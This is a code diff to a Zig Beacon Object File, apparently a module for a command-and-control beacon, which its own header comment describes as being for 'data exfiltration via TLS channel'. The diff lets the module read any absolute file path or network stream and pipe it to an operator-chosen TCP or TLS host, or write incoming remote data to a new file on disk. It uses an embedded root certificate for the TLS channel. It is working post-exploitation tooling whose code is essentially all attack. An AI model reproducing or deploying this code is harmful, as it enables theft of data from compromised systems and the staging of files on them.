@@ -14,10 +14,10 @@
 /// <sink-address> - an address that acts as data sink
 ///
 /// Currently available address types:
-///   OPEN:<filename> - currently available as <src-address> only
-///   CREATE:<filename> - currently available as <src-address> only
-///   TCP:<host:port> - currently available as <sink-address> only
-///   TLS:<host:port> - currently available as <sink-address> only
+///   OPEN:<filename>
+///   CREATE:<filename>
+///   TCP:<host:port>
+///   TLS:<host:ssl-enabled port>
 ///
 /// Example use case: data exfiltration via TLS channel with z-beac0n:
 ///
@@ -57,6 +57,7 @@ const BofErrors = enum(u8) {
     NoArgsProvided,
     BadArgsProvided,
     NotSupportedAddressType,
+    NoSuchFile,
     ConnectionError,
     DataTransferError,
     ReadFailedError,
@@ -142,15 +143,10 @@ fn checkAddressType(addr_type: []const u8) AddressType {
         return AddressType.UNRECOGNIZED;
 }
 
-fn pumpData(r_iface: *std.Io.Reader, w_iface: *std.Io.Writer) !usize {
-
-    const written = try r_iface.streamRemaining(w_iface);
-    return written;
-}
-
 pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
     @import("bof_api").init(adata, alen, .{});
 
+    bofapi.print(.output, "A tu? 1", .{});
     if (alen == 0) {
         return @intFromEnum(BofErrors.NoArgsProvided);
     }
@@ -159,6 +155,21 @@ pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
 
     var parser = beacon.datap{};
     beacon.dataParse(&parser, adata, alen);
+
+    var file_sink: ?std.fs.File = null;
+    var file_src: ?std.fs.File = null;
+    var tcp_src: ?std.net.Stream = null;
+    var tcp_sink: ?std.net.Stream = null;
+
+    var r_buffer: [tls.input_buffer_len]u8 = undefined;
+    var r_iface: *std.Io.Reader = undefined;
+
+    var w_buffer: [tls.output_buffer_len]u8 = undefined;
+    var w_iface: *std.Io.Writer = undefined;
+
+    var tls_buf: [tls.input_buffer_len]u8 = undefined;
+    var conn_src: ?tls.Connection = null;
+    var conn_sink: ?tls.Connection = null;
 
     var srcAddrType: AddressType = undefined;
     var src_addr_iter: std.mem.SplitIterator(u8, .scalar) = undefined;
@@ -169,83 +180,140 @@ pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
     const src_address = std.mem.sliceTo(beacon.dataExtract(&parser, null).?, 0);
     const sink_address = std.mem.sliceTo(beacon.dataExtract(&parser, null).?, 0);
 
-    if (!std.mem.eql(u8, "", src_address)) {
 
-        if(std.mem.eql(u8, "-", std.mem.sliceTo(src_address, 0)))
-            srcAddrType = AddressType.STDIN;
+    if(std.mem.eql(u8, "-", std.mem.sliceTo(src_address, 0)))
+        srcAddrType = AddressType.STDIN;
 
-        src_addr_iter = std.mem.splitScalar(u8, std.mem.sliceTo(src_address, 0), ':');
-        const addrPrefix = src_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);
+    // Checking type of <src-address>: get arg prefix and return its type:
+    src_addr_iter = std.mem.splitScalar(u8, std.mem.sliceTo(src_address, 0), ':');
+    const srcPrefix = src_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);
+    srcAddrType = checkAddressType(srcPrefix);
 
-        srcAddrType = checkAddressType(addrPrefix);
-        if (srcAddrType != AddressType.OPEN)
-            return @intFromEnum(BofErrors.NotSupportedAddressType);
+    if (srcAddrType == AddressType.TCP or srcAddrType == AddressType.TLS) {
 
-        const file_path = src_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);
-        const file = std.fs.openFileAbsolute(file_path, .{ .mode = .read_only }) catch return 1;
-        defer file.close();
+        //srcAddrType = checkAddressType(srcPrefix);
+        //if (!(srcAddrType == AddressType.TCP or srcAddrType == AddressType.TLS))
+        //    return @intFromEnum(BofErrors.NotSupportedAddressType);
 
-        var recv_buffer: [4096]u8 = undefined;
-        var file_r = file.reader(&recv_buffer);
-        const file_r_iface = &file_r.interface;
+        const host = src_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);
+        bofapi.print(.output, "Host: {s}", .{host});
+        const port = std.fmt.parseUnsigned(u16, src_addr_iter.next() orelse return 17, 10) catch return 1;
 
-        if (!std.mem.eql(u8, "", sink_address)) {
+        tcp_src = std.net.tcpConnectToHost(allocator, host, port) catch return @intFromEnum(BofErrors.ConnectionError);
 
-            sink_addr_iter = std.mem.splitScalar(u8, std.mem.sliceTo(sink_address, 0), ':');
-            const sinkPrefix = sink_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);
+        var reader = tcp_src.?.reader(&r_buffer);
+        r_iface = reader.interface();
 
-            sinkAddrType = checkAddressType(sinkPrefix);
-            if (!(sinkAddrType == AddressType.TCP or sinkAddrType == AddressType.TLS))
-                return @intFromEnum(BofErrors.NotSupportedAddressType);
+        if (srcAddrType == AddressType.TLS) {
+            var tls_writer = tcp_src.?.writer(&tls_buf);
 
-            const host = sink_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);
-            const port = std.fmt.parseUnsigned(u16, sink_addr_iter.next() orelse return 1, 10) catch return 1;
+            var root_ca: std.crypto.Certificate.Bundle = .{};
+            const s: []const u8 = minica_pem[0..minica_pem.len];
+            addCertsFromMemory(&root_ca, allocator, s) catch return 94;
+            defer root_ca.deinit(allocator);
 
-            const tcp = std.net.tcpConnectToHost(allocator, host, port) catch return @intFromEnum(BofErrors.ConnectionError);
-            defer tcp.close();
+            var diagnostic: tls.config.Client.Diagnostic = .{};
 
-            var tcp_buf: [tls.output_buffer_len]u8 = undefined;
-            var tcp_w = tcp.writer(&tcp_buf);
-
-            // Upgrade tcp connection to tls
-            if (sinkAddrType == AddressType.TLS) {
-                var tcp_buf_r: [tls.input_buffer_len]u8 = undefined;
-                var tcp_r = tcp.reader(&tcp_buf_r);
-
-                var root_ca: std.crypto.Certificate.Bundle = .{};
-                const s: []const u8 = minica_pem[0..minica_pem.len];
-                addCertsFromMemory(&root_ca, allocator, s) catch return 94;
-                defer root_ca.deinit(allocator);
-
-                var diagnostic: tls.config.Client.Diagnostic = .{};
-
-                var conn = tls.client(tcp_r.interface(), &tcp_w.interface, .{
-                    .host = host,
-                    .root_ca = root_ca,
-                    .diagnostic = &diagnostic,
-                }) catch return 98;
-
-                var n: usize = 0;
-                var tls_buf: [tls.output_buffer_len]u8 = undefined;
-                while(true) {
-                    n = file_r_iface.readSliceShort(&tls_buf) catch return 33;
-                    if (n < tls_buf.len) {
-                        conn.writeAll(tls_buf[0..n]) catch return 97;
-                        break;
-                    }
-                    else
-                        conn.writeAll(&tls_buf) catch return 97;
-
-                }
-
-                std.Thread.sleep(1000000000);
-                conn.close() catch return 11;
-                tcp.close();
-                return 0;
-            }
-
-            _ = pumpData(file_r_iface, &tcp_w.interface) catch @intFromEnum(BofErrors.DataTransferError);
+            conn_src = tls.client(r_iface, &tls_writer.interface, .{
+                .host = host,
+                .root_ca = root_ca,
+                .diagnostic = &diagnostic,
+            }) catch return 98;
         }
+    }
+    else if (srcAddrType == AddressType.OPEN) {
+
+        const file_path = src_addr_iter.next() orelse return @intFromEnum(BofErrors.NoSuchFile);
+        file_src = std.fs.openFileAbsolute(file_path, .{ .mode = .read_only }) catch return @intFromEnum(BofErrors.NoSuchFile);
+
+        var reader = file_src.?.reader(&r_buffer);
+        r_iface = &reader.interface;
+    }
+
+
+    // Checking type of <sink-address>: get arg prefix and return its type:
+    sink_addr_iter = std.mem.splitScalar(u8, std.mem.sliceTo(sink_address, 0), ':');
+    const sinkPrefix = sink_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);
+    sinkAddrType = checkAddressType(sinkPrefix);
+
+    if (sinkAddrType == AddressType.CREATE) {
+
+        const file_path = sink_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);
+        file_sink = std.fs.createFileAbsolute(file_path, .{ .truncate = true }) catch return 1;
+        //defer file.close();
+
+        var writer = file_sink.?.writer(&w_buffer);
+        w_iface = &writer.interface;
+    }
+    else if (sinkAddrType == AddressType.OPEN) {
+
+        const file_path = sink_addr_iter.next() orelse return @intFromEnum(BofErrors.NoSuchFile);
+        file_sink = std.fs.openFileAbsolute(file_path, .{ .mode = .write_only }) catch return @intFromEnum(BofErrors.NoSuchFile);
+
+        var writer = file_sink.?.writer(&w_buffer);
+        w_iface = &writer.interface;
+    }
+    else if (sinkAddrType == AddressType.TCP or sinkAddrType == AddressType.TLS) {
+
+        const host = sink_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);
+        bofapi.print(.output, "Host: {s}", .{host});
+        const port = std.fmt.parseUnsigned(u16, sink_addr_iter.next() orelse return 17, 10) catch return 1;
+
+        tcp_sink = std.net.tcpConnectToHost(allocator, host, port) catch return @intFromEnum(BofErrors.ConnectionError);
+
+        var writer = tcp_sink.?.writer(&w_buffer);
+        w_iface = &writer.interface;
+
+        if (sinkAddrType == AddressType.TLS) {
+            var tls_reader = tcp_sink.?.reader(&tls_buf);
+
+            var root_ca: std.crypto.Certificate.Bundle = .{};
+            const s: []const u8 = minica_pem[0..minica_pem.len];
+            addCertsFromMemory(&root_ca, allocator, s) catch return 94;
+            defer root_ca.deinit(allocator);
+
+            var diagnostic: tls.config.Client.Diagnostic = .{};
+
+            conn_sink = tls.client(tls_reader.interface(), w_iface, .{
+                .host = host,
+                .root_ca = root_ca,
+                .diagnostic = &diagnostic,
+            }) catch return 98;
+ 
+        }
+    }
+
+    var n: usize = 0;
+    var temp_buf: [tls.output_buffer_len]u8 = undefined;
+    while(true) {
+        if(srcAddrType == AddressType.TLS) {
+            n = conn_src.?.readAll(&temp_buf) catch return 34;
+        } else
+            n = r_iface.readSliceShort(&temp_buf) catch return 33;
+
+        bofapi.print(.output, "N: {d}\n", .{n});
+
+        if(sinkAddrType == AddressType.TLS) {
+            conn_sink.?.writeAll(temp_buf[0..n]) catch return 97;
+        } else
+            w_iface.writeAll(temp_buf[0..n]) catch return 97;
+
+        if (n < temp_buf.len)
+            break;
+    }
+    w_iface.flush() catch return 97;
+ 
+
+    std.Thread.sleep(1000000000);
+    if(srcAddrType == AddressType.TLS) {
+        conn_src.?.close() catch return 11;
+        tcp_src.?.close();
+    }
+
+    std.Thread.sleep(1000000000);
+    if(sinkAddrType == AddressType.TLS) {
+        conn_sink.?.close() catch return 11;
+        tcp_sink.?.close();
     }
 
     return 0;
